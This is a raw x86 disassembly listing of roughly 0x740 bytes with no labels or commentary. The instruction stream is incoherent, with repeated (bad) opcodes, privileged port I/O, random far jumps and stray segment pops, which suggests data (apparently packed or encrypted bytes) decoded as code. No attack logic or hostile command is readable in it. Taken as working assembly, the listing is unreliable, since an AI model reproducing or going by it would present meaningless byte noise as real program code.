  41d8c8:	push   ss
  41d8c9:	add    DWORD PTR [edx+0x52],edx
  41d8cc:	cmp    ah,dl
  41d8ce:	popa   
  41d8cf:	and    DWORD PTR [edx-0x41a7bb92],edx
  41d8d5:	test   DWORD PTR [ebp+0x3b209e5c],eax
  41d8db:	rcl    DWORD PTR ds:0xc6af900a,0x27
  41d8e2:	sbb    BYTE PTR [ebp+0x23],ah
  41d8e5:	outs   dx,DWORD PTR ds:[esi]
  41d8e6:	lock clc 
  41d8e8:	mov    esp,0x46e9b4d8
  41d8ed:	out    0x6f,eax
  41d8ef:	add    eax,0x115fb73d
  41d8f4:	cmp    eax,0x67c5279f
  41d8f9:	fcomp  DWORD PTR [esi+0x3c]
  41d8fc:	pop    es
  41d8fd:	in     eax,0xea
  41d8ff:	les    edx,FWORD PTR [ecx]
  41d901:	and    BYTE PTR [ebp-0x40],al
  41d904:	out    dx,al
  41d905:	je     0x41d95c
  41d907:	add    DWORD PTR [ecx-0x3d],edi
  41d90a:	btr    edi,eax
  41d90d:	xchg   ch,cl
  41d90f:	scas   eax,DWORD PTR es:[edi]
  41d910:	pushf  
  41d911:	mov    dh,BYTE PTR [ebp+0x4642a0a9]
  41d917:	fs (bad) 
  41d919:	aas    
  41d91a:	sub    DWORD PTR [esi],0x3d89f71e
  41d920:	jbe    0x41d8e5
  41d922:	(bad)  
  41d924:	sbb    eax,DWORD PTR [edi-0x5e]
  41d927:	dec    edi
  41d928:	and    edx,DWORD PTR [edx-0x3e]
  41d92b:	shl    DWORD PTR [eax-0x62144bca],1
  41d931:	push   edi
  41d932:	xchg   esi,eax
  41d933:	loop   0x41d916
  41d935:	imul   ebp,DWORD PTR [esi+edi*1+0x1eb3ec6d],0xc53e5055
  41d940:	ret    
  41d941:	jae    0x41d916
  41d943:	push   ebp
  41d944:	pop    ss
  41d945:	lods   al,BYTE PTR ds:[esi]
  41d946:	mov    edi,eax
  41d948:	cmp    eax,0x9ca5e7b2
  41d94d:	add    BYTE PTR [edi-0x76],ah
  41d950:	js     0x41d971
  41d952:	and    ebx,edx
  41d954:	sub    al,0x11
  41d956:	lahf   
  41d957:	mov    al,ds:0xf5090026
  41d95c:	leave  
  41d95d:	into   
  41d95e:	fst    DWORD PTR [eax+0x71cb451b]
  41d964:	rol    DWORD PTR [esi],0x6d
  41d967:	sbb    eax,0x57c1cf1
  41d96c:	leave  
  41d96d:	mov    esp,0xeca90ad8
  41d972:	icebp  
  41d973:	add    DWORD PTR [ecx-0x53],0x5521438d
  41d97a:	push   cs
  41d97b:	jmp    0x3c889c67
  41d980:	xchg   ebx,eax
  41d981:	ds xchg edi,eax
  41d983:	pusha  
  41d984:	xor    BYTE PTR [esp+edi*4+0x56282019],bh
  41d98b:	sub    bh,BYTE PTR [ebx-0xfebb368]
  41d991:	mov    ah,0x2e
  41d993:	cld    
  41d994:	daa    
  41d995:	or     eax,0x2d63d77e
  41d99a:	sub    al,BYTE PTR [ecx+0x1e]
  41d99d:	int3   
  41d99e:	ds or  al,0xd9
  41d9a2:	jp     0x41d943
  41d9a4:	ds xchg edx,eax
  41d9a6:	inc    esi
  41d9a7:	or     al,0xdb
  41d9a9:	and    edi,DWORD PTR [eax+0x64f503a9]
  41d9af:	out    dx,al
  41d9b0:	mov    ebp,0xc4b6af5c
  41d9b5:	push   0xffffffbd
  41d9b7:	out    dx,eax
  41d9b8:	outs   dx,BYTE PTR ds:[esi]
  41d9b9:	scas   eax,DWORD PTR es:[edi]
  41d9ba:	rol    eax,0xa8
  41d9bd:	mov    edx,0x33748dc7
  41d9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9c3:	mov    BYTE PTR [edx-0x60],0xce
  41d9c7:	push   0xffffffa5
  41d9c9:	and    BYTE PTR [eax+0x2],0xa0
  41d9cd:	imul   ebx,DWORD PTR ds:0x293dfeba,0xf
  41d9d4:	push   ebp
  41d9d5:	cmp    BYTE PTR [esi-0x5a65d965],0xf9
  41d9dc:	mov    ch,0xbf
  41d9de:	mov    cl,0xf2
  41d9e0:	xor    al,0xb4
  41d9e2:	push   0x44
  41d9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9e5:	aaa    
  41d9e6:	imul   esi,edx,0xde27df54
  41d9ec:	mov    ds:0x5e3e6bf2,eax
  41d9f1:	sub    al,bl
  41d9f3:	jno    0x41da39
  41d9f5:	adc    al,0x4
  41d9f7:	jge    0x41da10
  41d9f9:	push   es
  41d9fa:	shl    BYTE PTR [eax-0x39ba64e5],cl
  41da00:	je     0x41da2e
  41da02:	sub    dh,bl
  41da04:	xchg   cl,bh
  41da06:	dec    esi
  41da07:	xor    BYTE PTR [esi+0x19],dl
  41da0a:	mov    bh,0xf2
  41da0c:	push   edi
  41da0d:	jb     0x41da25
  41da0f:	fs std 
  41da11:	add    al,0x12
  41da13:	sbb    ebp,DWORD PTR [ebx-0x1c7eed4c]
  41da19:	je     0x41d9ea
  41da1b:	sbb    esp,ecx
  41da1d:	pop    eax
  41da1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da1f:	add    al,0xd
  41da21:	rcr    BYTE PTR [ebx+0x1c],0x5d
  41da25:	xor    eax,0xd0f5ad75
  41da2a:	lahf   
  41da2b:	ins    DWORD PTR es:[edi],dx
  41da2c:	add    esi,DWORD PTR [ecx]
  41da2e:	xor    bh,BYTE PTR [ebp+0x7c]
  41da31:	cmp    ecx,esp
  41da33:	sbb    esi,DWORD PTR [edi-0x45affaf2]
  41da39:	pop    ecx
  41da3a:	dec    ebp
  41da3b:	mov    ds:0x176f3dfd,eax
  41da40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da41:	stc    
  41da42:	rcr    ah,1
  41da44:	repz add eax,0xafcb1cfd
  41da4a:	mov    ah,0xf0
  41da4c:	mov    ds:0x17b9cf98,eax
  41da51:	or     al,0xcd
  41da53:	shl    BYTE PTR [esi-0x28],1
  41da56:	jnp    0x41da75
  41da58:	mov    bl,0x4
  41da5a:	lock outs dx,DWORD PTR ds:[esi]
  41da5c:	fist   DWORD PTR [esp+ebp*2+0x1ecad4c1]
  41da63:	icebp  
  41da64:	ror    BYTE PTR [ecx+0x78],1
  41da67:	cwde   
  41da68:	test   DWORD PTR ds:0x204f84e9,0x6d06cf96
  41da72:	pop    ss
  41da73:	jmp    0x41da45
  41da75:	xor    bh,BYTE PTR [esi]
  41da77:	inc    esp
  41da78:	pop    esp
  41da79:	mov    ebx,0x91105b56
  41da7e:	mov    bh,0xf0
  41da80:	imul   edx,DWORD PTR [eax-0x1a],0x7c4d325f
  41da87:	mov    ebx,0x8d559de3
  41da8c:	jno    0x41dade
  41da8e:	stos   BYTE PTR es:[edi],al
  41da8f:	leave  
  41da90:	popa   
  41da91:	sub    esi,DWORD PTR [eax+eiz*2]
  41da94:	clc    
  41da95:	repnz les eax,FWORD PTR [eax-0x4e]
  41da99:	pop    ecx
  41da9a:	in     al,dx
  41da9b:	in     al,dx
  41da9c:	mov    ah,0x90
  41da9e:	cmp    BYTE PTR [edx+ebp*8+0x40cfdf84],bh
  41daa5:	int    0xa8
  41daa7:	xor    DWORD PTR [eax+0x4a094826],esi
  41daad:	fidivr DWORD PTR [edi]
  41daaf:	in     al,dx
  41dab0:	cmc    
  41dab1:	jnp    0x41da3c
  41dab3:	push   ds
  41dab4:	jecxz  0x41daed
  41dab6:	retf   0x3f4e
  41dab9:	inc    eax
  41daba:	call   DWORD PTR [esi-0x5c]
  41dabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dabe:	mov    dh,0x50
  41dac0:	fidivr DWORD PTR [edx]
  41dac2:	hlt    
  41dac3:	or     al,0x51
  41dac5:	cmp    eax,DWORD PTR [esp+eiz*8-0x57]
  41dac9:	push   ss
  41daca:	scas   eax,DWORD PTR es:[edi]
  41dacb:	repnz mov ecx,0x429fe05c
  41dad1:	or     ecx,DWORD PTR [esi+0x77097b2c]
  41dad7:	shr    DWORD PTR [ebx],1
  41dad9:	sar    DWORD PTR [ebx+ebx*4-0x7a9dff28],cl
  41dae0:	das    
  41dae1:	in     al,0xff
  41dae3:	in     al,dx
  41dae4:	mov    eax,ds:0x748f9ef3
  41dae9:	test   al,0xc3
  41daeb:	mov    al,0x61
  41daed:	jge    0x41dad8
  41daef:	bnd jb 0x41db61
  41daf2:	mov    eax,ds:0xf5ec761c
  41daf7:	dec    edx
  41daf8:	push   ebx
  41daf9:	jo     0x41db60
  41dafb:	scas   eax,DWORD PTR es:[edi]
  41dafc:	mov    eax,0x4ceef3a5
  41db01:	lods   eax,DWORD PTR ds:[esi]
  41db02:	clc    
  41db03:	add    al,0xb5
  41db05:	cmp    al,0xaf
  41db07:	xor    eax,DWORD PTR [ecx]
  41db09:	test   DWORD PTR [edx],ebp
  41db0b:	push   ds
  41db0c:	jge    0x41db75
  41db0e:	mov    DWORD PTR ds:0xbc633d50,ecx
  41db14:	jecxz  0x41db2e
  41db16:	stos   DWORD PTR es:[edi],eax
  41db17:	ror    BYTE PTR [ecx-0x5962d42],1
  41db1d:	fadd   st(1),st
  41db1f:	aaa    
  41db20:	es sar dh,cl
  41db23:	shl    DWORD PTR [ecx+0x36eaddc9],0xc1
  41db2a:	shr    ah,1
  41db2c:	addr16 sti 
  41db2e:	pop    esp
  41db2f:	pop    ebx
  41db30:	cdq    
  41db31:	mov    ds:0xc28fc84a,eax
  41db36:	lahf   
  41db37:	pop    edx
  41db38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db39:	xchg   edx,eax
  41db3a:	push   ebx
  41db3b:	mov    WORD PTR [esi+ecx*4-0x668fa19],es
  41db42:	mov    dl,0x73
  41db44:	mov    edi,DWORD PTR [edi]
  41db46:	out    0x81,al
  41db48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db49:	mov    al,ds:0xae1da319
  41db4e:	(bad)  
  41db4f:	cmp    eax,0x4c26d8bd
  41db54:	sub    bl,dl
  41db56:	or     BYTE PTR [eax-0x67281193],ah
  41db5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db5e:	add    BYTE PTR [edx],ch
  41db60:	in     eax,0x33
  41db62:	daa    
  41db63:	inc    edi
  41db64:	(bad)  
  41db65:	add    edx,DWORD PTR [ebp+edi*4+0x77]
  41db69:	js     0x41db14
  41db6b:	push   ebp
  41db6c:	push   ss
  41db6d:	and    ebx,ebp
  41db6f:	lds    ebx,FWORD PTR [esi+esi*2]
  41db72:	fistp  DWORD PTR [edi-0x14]
  41db75:	into   
  41db76:	stos   BYTE PTR es:[edi],al
  41db77:	pop    es
  41db78:	mov    eax,0x988896e0
  41db7d:	inc    ebp
  41db7e:	cmp    al,0xce
  41db80:	inc    eax
  41db81:	jmp    0x359b:0x146b1b51
  41db88:	push   ss
  41db89:	out    0x54,al
  41db8b:	inc    edi
  41db8c:	pop    ecx
  41db8d:	mov    ch,0x9c
  41db8f:	pop    eax
  41db90:	xchg   edx,eax
  41db91:	sub    BYTE PTR [ebx-0x79be69],cl
  41db97:	mov    eax,ds:0x716c1a2d
  41db9c:	fwait
  41db9d:	sbb    BYTE PTR [edi+0x7f],0x9
  41dba1:	cld    
  41dba2:	pop    ss
  41dba3:	fisttp WORD PTR [edi]
  41dba5:	dec    esi
  41dba6:	jge    0x41dbc3
  41dba8:	pop    edi
  41dba9:	mov    bh,0xb3
  41dbab:	and    esp,DWORD PTR [ebp+ebx*2+0xb]
  41dbaf:	xor    al,0xe9
  41dbb1:	ror    BYTE PTR [esi+0x7d],1
  41dbb4:	lods   al,BYTE PTR ds:[esi]
  41dbb5:	loopne 0x41dbb6
  41dbb7:	dec    eax
  41dbb8:	xor    bl,BYTE PTR [eax-0x42]
  41dbbb:	scas   eax,DWORD PTR es:[edi]
  41dbbc:	fbld   TBYTE PTR [esi+0x35cf27af]
  41dbc2:	les    ebp,FWORD PTR [ebx-0x1]
  41dbc5:	lock mov edx,0x49b1f0bc
  41dbcb:	adc    cl,BYTE PTR [eax-0x4d7f8f8d]
  41dbd1:	dec    ebx
  41dbd2:	in     eax,0x71
  41dbd4:	(bad)  
  41dbd5:	dec    eax
  41dbd6:	cmp    al,0xc3
  41dbd8:	gs (bad) 
  41dbda:	ins    DWORD PTR es:[edi],dx
  41dbdb:	inc    esp
  41dbdc:	xor    DWORD PTR [esi-0x54df52d1],esp
  41dbe2:	jp     0x41dbd6
  41dbe4:	sbb    edi,edi
  41dbe6:	scas   al,BYTE PTR es:[edi]
  41dbe7:	test   al,0x7b
  41dbe9:	(bad)  
  41dbea:	xor    al,0x6c
  41dbec:	jl     0x41dc34
  41dbee:	mov    al,BYTE PTR [ecx-0x1cd6cd0c]
  41dbf4:	mov    ds:0xbbfeaac,al
  41dbf9:	pop    ecx
  41dbfa:	sbb    cl,bl
  41dbfc:	test   eax,0xcf431db6
  41dc01:	sbb    al,0x52
  41dc03:	pop    es
  41dc04:	mov    dl,BYTE PTR [edx-0x7]
  41dc07:	jecxz  0x41dc35
  41dc09:	in     al,0x60
  41dc0b:	mov    eax,0x2997cbcc
  41dc10:	into   
  41dc11:	je     0x41dbfd
  41dc13:	cmp    eax,0x558d046f
  41dc18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc19:	fwait
  41dc1a:	pop    edx
  41dc1b:	test   esp,esi
  41dc1d:	mov    edx,edx
  41dc1f:	sub    DWORD PTR ds:0x2eef5ebf,0x15
  41dc26:	(bad)  
  41dc27:	xchg   ebx,eax
  41dc28:	xor    dl,ch
  41dc2a:	mov    ebx,0x55ffd519
  41dc2f:	sbb    eax,0x6296779b
  41dc34:	xchg   edx,eax
  41dc35:	mov    bh,0xf6
  41dc37:	sub    BYTE PTR [esi+0x1a03bdf],bl
  41dc3d:	jle    0x41dbe3
  41dc3f:	cmp    eax,DWORD PTR [edx-0x4f7244e9]
  41dc45:	pop    esp
  41dc46:	icebp  
  41dc47:	gs pop ds
  41dc49:	jne    0x41dc7d
  41dc4b:	dec    ebp
  41dc4c:	fwait
  41dc4d:	outs   dx,BYTE PTR ds:[esi]
  41dc4e:	cli    
  41dc4f:	sti    
  41dc50:	in     al,dx
  41dc51:	ds pusha 
  41dc53:	xchg   esp,eax
  41dc54:	sub    ch,BYTE PTR [ebx]
  41dc56:	(bad)  
  41dc57:	jp     0x41dc69
  41dc59:	xchg   esp,esp
  41dc5b:	xor    DWORD PTR [edi],edx
  41dc5d:	fsubr  QWORD PTR [ebx]
  41dc5f:	and    DWORD PTR [edi-0x44],esp
  41dc62:	rol    BYTE PTR [ecx],1
  41dc64:	test   DWORD PTR [esi+0x7b],0x84a29c3c
  41dc6b:	fild   QWORD PTR [esi+0x67a1ddbc]
  41dc71:	in     al,dx
  41dc72:	stos   BYTE PTR es:[edi],al
  41dc73:	pop    ss
  41dc74:	mov    dh,0x46
  41dc76:	loop   0x41dc47
  41dc78:	jbe    0x41dcd6
  41dc7a:	jecxz  0x41dc7d
  41dc7c:	mov    cl,0x47
  41dc7e:	push   edx
  41dc7f:	inc    edi
  41dc80:	jecxz  0x41dc5a
  41dc82:	icebp  
  41dc83:	popf   
  41dc84:	mov    esp,0xf2d9a4ec
  41dc89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc8a:	sub    DWORD PTR ds:[edi+0x660cbcaa],eax
  41dc91:	mov    al,0xf4
  41dc93:	xchg   esi,eax
  41dc94:	xor    al,0xb9
  41dc96:	shr    DWORD PTR [edi-0x72],1
  41dc99:	jle    0x41dc29
  41dc9b:	fist   WORD PTR [ecx+0x27f93327]
  41dca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dca2:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41dca4:	(bad)  
  41dca6:	and    esp,ebp
  41dca8:	lods   eax,DWORD PTR ds:[esi]
  41dca9:	iret   
  41dcaa:	add    bh,BYTE PTR [esi+0xd]
  41dcad:	mov    ds:0xe4c6b91c,al
  41dcb2:	xchg   DWORD PTR [ebp-0x5058ad26],ebx
  41dcb8:	int3   
  41dcb9:	cld    
  41dcba:	mov    ds:0x1e0879b,al
  41dcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcc1:	push   esp
  41dcc2:	pop    edx
  41dcc3:	xor    al,0x7
  41dcc5:	enter  0x4c0b,0xcf
  41dcc9:	mov    dh,0xe7
  41dccb:	xchg   ecx,eax
  41dccc:	push   esp
  41dccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcce:	pop    ebp
  41dccf:	mov    ds:0x92577f5e,eax
  41dcd4:	push   ss
  41dcd5:	daa    
  41dcd6:	lock jmp 0x3318:0x2f5471ca
  41dcde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcdf:	mov    BYTE PTR [ecx-0x38],ah
  41dce2:	mov    cl,0xa9
  41dce4:	mov    dl,0xee
  41dce6:	in     al,0xe5
  41dce8:	fild   QWORD PTR ds:0xf7079c0b
  41dcee:	gs push esi
  41dcf0:	xchg   BYTE PTR [esi],bh
  41dcf2:	repnz popf 
  41dcf4:	test   BYTE PTR [esi-0x7c277d37],al
  41dcfa:	dec    ecx
  41dcfb:	iret   
  41dcfc:	dec    esp
  41dcfd:	(bad)
  41dd00:	jp     0x41dcd7
  41dd02:	sub    eax,0xa0fe75ea
  41dd07:	frstor [ebp+0x1319154d]
  41dd0d:	dec    ebp
  41dd0e:	add    BYTE PTR [eax-0x7851314f],bl
  41dd14:	ficom  DWORD PTR [edi+0x54b5d4a7]
  41dd1a:	mov    bl,0x71
  41dd1c:	ss stc 
  41dd1e:	add    dl,BYTE PTR [edi+esi*4+0x1a28bbe9]
  41dd25:	jae    0x41dd41
  41dd27:	xchg   edi,eax
  41dd28:	stos   DWORD PTR es:[edi],eax
  41dd29:	add    eax,0xd1674837
  41dd2e:	mov    bl,0xb8
  41dd30:	inc    edx
  41dd31:	inc    ebp
  41dd32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd33:	cdq    
  41dd34:	mov    ebx,edi
  41dd36:	push   ebp
  41dd37:	int    0x11
  41dd39:	leave  
  41dd3a:	mov    edi,ecx
  41dd3c:	aad    0x2f
  41dd3e:	jmp    edi
  41dd40:	shl    DWORD PTR [ecx],1
  41dd42:	pop    es
  41dd43:	push   edi
  41dd44:	repz dec ecx
  41dd46:	sub    BYTE PTR [esi+0x54d6d6fc],0x8
  41dd4d:	sub    esp,DWORD PTR [ebx]
  41dd4f:	repz push 0xffffffb1
  41dd52:	mov    edx,0x4015cd2f
  41dd57:	std    
  41dd58:	xchg   edx,eax
  41dd59:	mov    eax,0xcddbde69
  41dd5e:	(bad)  
  41dd60:	in     eax,dx
  41dd61:	in     al,0x76
  41dd63:	pop    ecx
  41dd64:	cld    
  41dd65:	sub    al,al
  41dd67:	dec    ecx
  41dd68:	xor    BYTE PTR [ebx+0x79],al
  41dd6b:	jmp    0x41dcf6
  41dd6d:	mov    al,ds:0xff521788
  41dd72:	inc    ebx
  41dd73:	test   al,0x3c
  41dd75:	gs mov ebx,0x7129d651
  41dd7b:	test   al,0xad
  41dd7d:	scas   al,BYTE PTR es:[edi]
  41dd7e:	ja     0x41dd5b
  41dd80:	retf   
  41dd81:	das    
  41dd82:	cmp    al,0x71
  41dd85:	mov    al,0xfc
  41dd87:	pop    edx
  41dd88:	cmp    ch,BYTE PTR [eax+0x6a]
  41dd8b:	scas   eax,DWORD PTR es:[edi]
  41dd8c:	scas   eax,DWORD PTR es:[edi]
  41dd8d:	mov    ds:0xfcf97bee,eax
  41dd92:	mov    esi,0x1b626de4
  41dd97:	int    0x3b
  41dd99:	in     eax,dx
  41dd9a:	scas   eax,DWORD PTR es:[edi]
  41dd9b:	cld    
  41dd9c:	outs   dx,DWORD PTR ds:[esi]
  41dd9d:	and    BYTE PTR [edi-0x6a],bl
  41dda0:	xor    edi,edi
  41dda2:	push   es
  41dda3:	fst    DWORD PTR [eax]
  41dda5:	jne    0x41dd64
  41dda7:	(bad)  
  41dda8:	leave  
  41dda9:	add    cl,BYTE PTR [ebp+0x77]
  41ddac:	inc    edi
  41ddad:	loopne 0x41dd72
  41ddaf:	adc    al,0xf3
  41ddb1:	js     0x41dd71
  41ddb3:	icebp  
  41ddb4:	sub    cl,al
  41ddb6:	int3   
  41ddb7:	mov    dh,BYTE PTR [edi+0x632f2fb9]
  41ddbd:	je     0x41de3a
  41ddbf:	sub    BYTE PTR [ebx],ch
  41ddc1:	sub    ch,BYTE PTR [ecx+0x2ed331f7]
  41ddc7:	call   0x6ea3b633
  41ddcc:	pushf  
  41ddcd:	xchg   ebp,eax
  41ddce:	push   0xffffff81
  41ddd0:	sbb    dh,al
  41ddd2:	pop    ss
  41ddd3:	add    ebp,ecx
  41ddd5:	sub    ch,dh
  41ddd7:	ja     0x41dd6f
  41ddd9:	dec    edi
  41ddda:	dec    esp
  41dddb:	push   ds
  41dddc:	test   eax,0x7aa5a439
  41dde1:	inc    esi
  41dde2:	je     0x41ddfb
  41dde4:	pop    sp
  41dde6:	pusha  
  41dde7:	push   0x2d89e3b5
  41ddec:	jo     0x41ddf9
  41ddee:	mov    ecx,0xf081a482
  41ddf3:	pop    ss
  41ddf4:	and    BYTE PTR [ebx-0x5d83c494],ah
  41ddfa:	pop    esi
  41ddfb:	push   esi
  41ddfc:	mov    ecx,0x11b4db8e
  41de01:	push   ebx
  41de02:	push   ss
  41de03:	loopne 0x41ddb0
  41de05:	xor    ebx,DWORD PTR [edx]
  41de07:	imul   esi,DWORD PTR [ebp-0x16],0x5a25bc68
  41de0e:	aaa    
  41de0f:	jle    0x41dda0
  41de11:	xor    edx,DWORD PTR [eax-0x56151fd2]
  41de17:	and    al,0x4d
  41de19:	shr    DWORD PTR [ebx-0x34],1
  41de1c:	push   es
  41de1d:	xchg   esp,eax
  41de1e:	scas   eax,DWORD PTR es:[edi]
  41de1f:	fcmovnb st,st(7)
  41de21:	push   es
  41de22:	ins    DWORD PTR es:[edi],dx
  41de23:	mov    BYTE PTR [ebx+ebp*4-0x22505961],ah
  41de2a:	fucom  st(1)
  41de2c:	inc    ebp
  41de2d:	push   ebp
  41de2e:	mov    eax,ds:0x5fd1004d
  41de33:	jns    0x41de05
  41de35:	ret    
  41de36:	icebp  
  41de37:	cwde   
  41de38:	and    DWORD PTR [edi+0x43135372],0xffffffcb
  41de3f:	add    ch,BYTE PTR [ebx]
  41de41:	xor    esp,DWORD PTR [esi-0x7a]
  41de44:	cmp    al,0xa8
  41de46:	and    ebp,DWORD PTR [esi-0x518fc6de]
  41de4c:	inc    esi
  41de4d:	mov    bl,0xf7
  41de4f:	pop    edi
  41de50:	mov    ebp,eax
  41de52:	lea    esi,[edi+0x42]
  41de55:	xchg   ecx,eax
  41de56:	or     eax,0xf3925e1c
  41de5b:	inc    ebx
  41de5c:	sub    ebp,edi
  41de5e:	retf   
  41de5f:	push   edx
  41de60:	mov    al,0xc7
  41de62:	mov    esi,0xedec0691
  41de67:	mov    ?,WORD PTR [edx-0x374801e6]
  41de6d:	lea    esp,ds:0x20186222
  41de73:	jl     0x41de62
  41de75:	sbb    al,0x4c
  41de77:	mov    ds:0x12321e35,al
  41de7c:	(bad)  
  41de7d:	test   bl,dl
  41de7f:	shr    DWORD PTR [ecx+0x20389bb8],1
  41de85:	retf   0x3642
  41de88:	mov    al,ds:0xe85ccccb
  41de8d:	push   0x4a
  41de8f:	adc    edx,0x3a
  41de92:	ret    
  41de93:	in     al,dx
  41de94:	mov    eax,0x9e5d7770
  41de99:	dec    ecx
  41de9a:	sbb    DWORD PTR [eax+0x75],esi
  41de9d:	ja     0x41de35
  41de9f:	cmp    DWORD PTR [edx+0x2],esp
  41dea2:	jle    0x41df23
  41dea4:	mov    DWORD PTR [edx],esp
  41dea6:	enter  0x99b2,0xc5
  41deaa:	outs   dx,BYTE PTR ds:[esi]
  41deab:	pop    ecx
  41deac:	int3   
  41dead:	mov    ch,0x7c
  41deaf:	mov    al,0x9c
  41deb1:	push   edx
  41deb2:	in     eax,dx
  41deb3:	mov    ds:0x910d45d5,al
  41deb8:	mov    fs,WORD PTR [edi-0x53913282]
  41debe:	(bad)  
  41debf:	or     esp,DWORD PTR [edi+ebp*8-0x11]
  41dec3:	gs nop
  41dec5:	pop    ecx
  41dec6:	ins    BYTE PTR es:[edi],dx
  41dec7:	fwait
  41dec8:	clc    
  41dec9:	(bad)  
  41decb:	adc    BYTE PTR [esi],0x9b
  41dece:	cli    
  41decf:	push   cs
  41ded0:	xlat   BYTE PTR ds:[ebx]
  41ded1:	inc    esi
  41ded2:	dec    DWORD PTR [ecx-0x3f]
  41ded5:	dec    eax
  41ded6:	and    al,0xdc
  41ded8:	and    BYTE PTR [edx],bl
  41deda:	aaa    
  41dedb:	xlat   BYTE PTR ds:[ebx]
  41dedc:	and    esi,ecx
  41dede:	aaa    
  41dedf:	test   ch,0x9f
  41dee2:	lahf   
  41dee3:	pop    esi
  41dee4:	dec    edx
  41dee5:	pusha  
  41dee6:	mov    esp,0x565233c8
  41deeb:	and    ah,BYTE PTR es:[eax]
  41deee:	nop
  41deef:	xor    dl,BYTE PTR [ecx+0x45]
  41def2:	into   
  41def3:	xor    edx,DWORD PTR [ebp+0x622aaab6]
  41def9:	enter  0x7e43,0x12
  41defd:	and    DWORD PTR [ebx+0x78],edx
  41df00:	adc    eax,DWORD PTR [eax-0x25]
  41df03:	sub    BYTE PTR [edi],al
  41df05:	mov    esp,0x323bbbd4
  41df0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df0b:	arpl   WORD PTR [edx+0x5e8ba002],sp
  41df11:	lock ret 
  41df13:	pop    eax
  41df14:	je     0x41df32
  41df16:	xchg   edi,eax
  41df17:	cmp    esp,DWORD PTR [eax+ebx*4+0x6cf82365]
  41df1e:	pop    eax
  41df1f:	cmp    dh,BYTE PTR [ecx+eax*2+0x5d]
  41df23:	icebp  
  41df24:	dec    ebp
  41df25:	mov    al,0xcd
  41df27:	cli    
  41df28:	pusha  
  41df29:	push   esi
  41df2a:	push   ebp
  41df2b:	xor    al,0x2
  41df2d:	dec    ebx
  41df2e:	in     eax,dx
  41df2f:	mov    esi,0x2eaa7130
  41df34:	(bad)  
  41df35:	not    bh
  41df37:	popa   
  41df38:	sbb    esi,DWORD PTR [edi-0x12]
  41df3b:	pop    ss
  41df3c:	cmp    cl,bl
  41df3e:	popf   
  41df3f:	clc    
  41df40:	xchg   BYTE PTR [ecx+edi*4],bl
  41df43:	xor    eax,0xe775b95c
  41df48:	mov    al,0x17
  41df4a:	adc    ebp,DWORD PTR [edx+ecx*8+0x5b]
  41df4e:	cmc    
  41df4f:	sub    BYTE PTR [bx+di+0x2d25],bl
  41df54:	jge    0x41df0f
  41df56:	mov    BYTE PTR [ebp-0x6f],ah
  41df59:	pusha  
  41df5a:	inc    ebp
  41df5b:	sub    edx,DWORD PTR [ecx-0x66274e0c]
  41df61:	je     0x41df14
  41df63:	add    al,0xe6
  41df65:	call   0x9e51:0xcce19c2f
  41df6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df6d:	sub    ah,BYTE PTR [esi-0x20]
  41df70:	mov    bh,0x52
  41df72:	dec    edx
  41df73:	push   ds
  41df74:	(bad)  
  41df75:	dec    eax
  41df76:	xchg   DWORD PTR [eax+0x64],ebp
  41df79:	add    bl,BYTE PTR [esi+0x27]
  41df7c:	ins    BYTE PTR es:[edi],dx
  41df7d:	pop    esp
  41df7e:	mov    al,ds:0xbd941077
  41df83:	(bad)  
  41df84:	mov    WORD PTR [edx-0x35],gs
  41df87:	sbb    esi,ebx
  41df89:	adc    ah,BYTE PTR [ebp+0x54]
  41df8c:	and    DWORD PTR [esi],eax
  41df8e:	adc    al,0xc9
  41df90:	out    dx,eax
  41df91:	add    DWORD PTR [ebx],ecx
  41df93:	mov    ebp,0x5a578250
  41df98:	int    0x13
  41df9a:	popa   
  41df9b:	popa   
  41df9c:	(bad)  
  41df9d:	lahf   
  41df9e:	mov    esp,0x8dd8ff8b
  41dfa3:	push   0x8dcd5f91
  41dfa8:	cmp    DWORD PTR gs:[bx+0x58],0xffffffd2
  41dfae:	push   DWORD PTR [esp+ecx*8]
  41dfb1:	(bad)  
  41dfb2:	sbb    bl,BYTE PTR [eax]
  41dfb4:	je     0x41df86
  41dfb6:	mov    al,dl
  41dfb8:	call   FWORD PTR [esi-0x56]
  41dfbb:	cwde   
  41dfbc:	imul   ebx,DWORD PTR [ebp+0x1],0xe248057
  41dfc3:	mov    esp,0xeadec7f5
  41dfc8:	sbb    eax,DWORD PTR [esp+ecx*8-0x71]
  41dfcc:	push   eax
  41dfcd:	jmp    0xaaf9:0xca388e2e
  41dfd4:	aam    0x48
  41dfd6:	xchg   esp,eax
  41dfd7:	push   cs
  41dfd8:	add    BYTE PTR fs:[esi-0x2bbd63d5],ch
  41dfdf:	call   0xdd395e1e
  41dfe4:	or     cl,bl
  41dfe6:	sub    ecx,ebp
  41dfe8:	mov    edx,0x456261de
  41dfed:	cmp    esp,esi
  41dfef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff0:	sub    ebx,DWORD PTR [ebx]
  41dff2:	pop    edx
  41dff3:	pop    ds
  41dff4:	jns    0x41dffc
  41dff6:	icebp  
  41dff7:	cmp    bh,BYTE PTR [esp+ebp*1-0xb]
  41dffb:	jg     0x41e069
  41dffd:	adc    DWORD PTR [ecx+0x14],ebp
  41e000:	adc    al,cl
  41e002:	cld    
